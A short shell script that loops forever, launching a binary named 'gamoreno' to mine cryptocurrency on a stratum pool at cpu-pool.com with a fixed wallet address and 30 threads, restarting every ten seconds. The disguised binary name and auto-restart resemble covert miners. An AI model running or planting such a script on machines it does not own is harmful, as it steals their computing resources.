#!/bin/sh
while [ 1 ]; do
./gamoreno -a cpupower -o stratum+tcp://cpu-pool.com:63387 -u CNCLk3AudsCg2hWaPLS8CLdF7XK9ndUsmC -t 30
sleep 10
done
